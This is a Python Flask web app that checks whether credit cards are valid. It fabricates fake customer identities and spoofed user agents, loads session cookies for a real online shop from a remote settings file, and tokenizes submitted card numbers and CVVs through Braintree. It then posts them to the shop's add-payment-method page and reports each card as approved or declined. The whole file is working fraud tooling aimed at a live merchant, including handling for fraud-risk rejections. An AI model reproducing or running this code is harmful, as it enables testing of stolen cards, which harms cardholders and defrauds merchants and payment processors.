from flask import Flask, render_template, request
import requests
from faker import Faker
import random
import json
from lxml import html

app = Flask(__name__, template_folder='.')

fake = Faker("en_US")
domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

def fetch_city_zipcode_data():
    url = "https://raw.githubusercontent.com/AbderrezakLzone/country-map/refs/heads/main/US/state.json"
    try:
        response = requests.get(url)

        if response.status_code == 200:
            return response.json()
        else:
            print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {e}")
        return False
    
# Load the data from the GitHub file
def load_data_from_github(token):
    url = "https://raw.githubusercontent.com/ANYA-LZ/anya-settings/refs/heads/main/gateways_map.json"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                print("Failed to parse JSON from the response.")
                return False
        else:
            print(f"Failed to load data from GitHub, status code: {response.status_code}, {response.text}")
            return False
    except requests.RequestException as e:
        print(f"An error occurred while fetching the data: {e}")
        return False

def generate_random_person():
    city_zipcode_data = fetch_city_zipcode_data()
    if not city_zipcode_data:
        return False

    state_name = random.choice(list(city_zipcode_data.keys()))
    city_name = random.choice(list(city_zipcode_data[state_name].keys()))
    zipcode = city_zipcode_data[state_name][city_name]
    
    phone = fake.phone_number()

    phone = phone.replace("(", "").replace(")", "").replace(" ", "").replace("-", "")
    if phone[:3] != zipcode[:3]:
        phone = f"({zipcode[:3]})-{phone[3:6]}-{phone[6:]}"

    return {
        'firstname': fake.first_name(),
        'lastname': fake.last_name(),
        'username': fake.user_name()[:10],
        'password': fake.password(),
        'email': f"{fake.user_name()[:10]}@{random.choice(domains)}",
        'phone': phone,
        'city': city_name,
        'country': "United States",
        'state': state_name,
        'zipcode': zipcode,
        'address': fake.street_address(),
        'useragent': fake.user_agent(),
    }
    
def get_nonce(cookies, random_person):
    url = 'https://www.natureswellnessmarket.com/my-account/add-payment-method/'
    params = {'_wc_user_reg': "true"}
    headers = {
        'User-Agent': random_person['useragent'],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.natureswellnessmarket.com',
        'referer': 'https://www.natureswellnessmarket.com/my-account/add-payment-method/',
    }

    try:
        with requests.Session() as session:
            session.headers.update(headers)
            response = session.post(url, params=params, cookies=cookies, timeout=10).content
            
        tree = html.fromstring(response)
        nonce_value = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        return nonce_value[0] if nonce_value else None
    except requests.Timeout:
        print(f"Timeout occurred while fetching nonce for {url}")
        return False
    except Exception as e:
        print(f"Failed to fetch nonce: {e}")
        return False

def get_token(card, month, year, cvv, random_person, accessTokens):
    headers = {
        'authorization': f'Bearer {accessTokens}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'user-agent': random_person['useragent'],
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': fake.uuid4(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': random_person['zipcode'],
                        'streetAddress': random_person['state'],
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        if 'tokencc_b' in response.text:
            data = json.loads(response.text)
            token = data['data']['tokenizeCreditCard']['token']
            return token
        else:
            return False
    except requests.RequestException as e:
        print(f"Failed to get token: {e}")
        return False

def check_card(token, random_person, cookies, nonce, accessToken):
    url = 'https://www.natureswellnessmarket.com/my-account/add-payment-method/'

    headers = {
        'User-Agent': random_person['useragent'],
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.natureswellnessmarket.com',
        'referer': 'https://www.natureswellnessmarket.com/my-account/add-payment-method/',
    }

    data = {
        'payment_method': "braintree_cc",
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': f"{{\"device_session_id\":\"{fake.uuid4()}\",\"fraud_merchant_id\":null,\"correlation_id\":\"{fake.uuid4()}\"}}",
        'braintree_cc_3ds_nonce_key': "",
        'braintree_cc_config_data': f"{{\"environment\":\"production\",\"clientApiUrl\":\"https://api.braintreegateway.com:443/merchants/qkr83g4mw8425xdk/client_api\",\"assetsUrl\":\"https://assets.braintreegateway.com\",\"analytics\":{{\"url\":\"https://client-analytics.braintreegateway.com/qkr83g4mw8425xdk\"}},\"merchantId\":\"qkr83g4mw8425xdk\",\"venmo\":\"off\",\"graphQL\":{{\"url\":\"https://payments.braintree-api.com/graphql\",\"features\":[\"tokenize_credit_cards\"]}},\"braintreeApi\":{{\"accessToken\":\"{accessToken}\",\"url\":\"https://payments.braintree-api.com\"}},\"kount\":{{\"kountMerchantId\":null}},\"challenges\":[\"cvv\",\"postal_code\"],\"creditCards\":{{\"supportedCardTypes\":[\"Discover\",\"JCB\",\"MasterCard\",\"Visa\",\"American Express\",\"UnionPay\"]}},\"threeDSecureEnabled\":false,\"threeDSecure\":null,\"paypalEnabled\":true,\"paypal\":{{\"displayName\":\"Natures Wellness Market L.L.C.\",\"clientId\":\"ATh6OWR1bfwIQ-SIeC2FoX3Vg-NYTPEjNyPsJ9ZfnjVrhi3_dHaR2RqOxEI9aXlzv2gMAlU2nzT3-1_e\",\"privacyUrl\":null,\"userAgreementUrl\":null,\"assetsUrl\":\"https://checkout.paypal.com\",\"environment\":\"live\",\"environmentNoNetwork\":false,\"unvettedMerchant\":false,\"braintreeClientId\":\"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW\",\"billingAgreementsEnabled\":true,\"merchantAccountId\":\"NaturesWellnessMarketLLC_instant\",\"payeeEmail\":null,\"currencyIsoCode\":\"USD\"}}}}",
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': "/my-account/add-payment-method/",
        'woocommerce_add_payment_method': "1"
    }

    try:
        response = requests.post(url, cookies=cookies, headers=headers, data=data).content
        tree = html.fromstring(response)
        error_message = tree.xpath('//div[@class="woocommerce-MyAccount-content"]//ul[@class="woocommerce-error"]/li/text()')

        if error_message:
            cleaned_message = error_message[0].strip().replace('\n', '').replace('\t', '')

            return cleaned_message
        else:
            print(f"ERROR: Unknown {response}")
            return "MAYBE APPROVED"
    except Exception as e:
        print(f"Failed to check card: {e}")
        return False

def process_payment(card_number, exp_month, exp_year, cvv, cookies_path, accessToken):
    try:

        cookies_path_parts = cookies_path.split("|")
        if len(cookies_path_parts) != 5:
            return "ERROR: FAILED TO FETCH COOKIES PARTS"
        
        gateway, version, url, cookie_key, token = cookies_path_parts

        data = load_data_from_github(token)
        if not data:
            return "ERROR: FAILED TO LOAD DATA FROM GITHUB"

        try:
            selected_cookies = data[gateway][version][url]["cookies"].get(cookie_key, [])
            formatted_cookies = {cookie['name']: cookie['value'] for cookie in selected_cookies}

            json.dumps(formatted_cookies)
        except KeyError:
            return "ERROR: INVALID KEYS IN DATA"
        except json.JSONDecodeError:
            return "ERROR: COOKIES FORMAT IS NOT VALID JSON"
        except Exception as e:
            return f"ERROR: {str(e)}"

        random_person = generate_random_person()
        if not random_person:
            return "ERROR: FAILED TO FETCH CITY ZIPCODE DATA"

        nonce = get_nonce(formatted_cookies, random_person)
        if not nonce:
            return f"ERROR: FAILED TO FETCH NONCE {formatted_cookies}"

        token = get_token(card_number, exp_month, exp_year, cvv, random_person, accessToken)
        if not token:
            return "ERROR: FAILED TO GET TOKEN"

        response = check_card(token, random_person, formatted_cookies, nonce, accessToken)
        return response

    except Exception as e:
        print(f"An error occurred: {e}")
        return "ERROR: Unknown"
    
APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

def parse_response(card_number, exp_month, exp_year, cvv, cookies, accessToken):
    response = process_payment(card_number, exp_month, exp_year, cvv, cookies, accessToken)

    if "ERROR" in response:
        return ERROR, response

    if "Reason:" in response:
        reason = response.split("Reason:")[-1].strip()
        if reason == "Gateway Rejected: risk_threshold":
            return ERROR, "ERROR: RISK: Retry this BIN later"
        return DECLINED, reason
    
    if "MAYBE APPROVED" in response:
        return APPROVED, response

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        card_number = request.form['card_number']
        exp_month = request.form['exp_month']
        exp_year = request.form['exp_year']
        cvv = request.form['cvv']
        cookies_path = request.form['cookies']
        accessToken = request.form['accessToken']

        status, response = parse_response(card_number, exp_month, exp_year, cvv, cookies_path, accessToken)
        return render_template('result.html', status=status, response=response)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
